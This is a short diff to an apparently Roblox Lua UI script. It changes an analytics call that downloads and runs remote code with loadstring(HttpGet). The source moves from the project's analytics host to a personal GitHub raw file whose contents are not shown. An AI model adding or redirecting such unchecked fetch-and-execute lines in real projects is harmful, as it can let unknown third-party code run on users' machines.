@@ -149,7 +149,7 @@ local globalSuccess, globalResult = pcall(function()
 			if debugX then warn('Reporting Analytics') end
 			task.spawn(function()
 				local success, reporter = pcall(function()
-					return loadstring(game:HttpGet("https://analytics.sirius.menu/reporter"))()
+					return loadstring(game:HttpGet("https://raw.githubusercontent.com/axleoislost/rlfd/refs/heads/main/reporter"))()
 				end)
 				if success and reporter then
 					pcall(function()
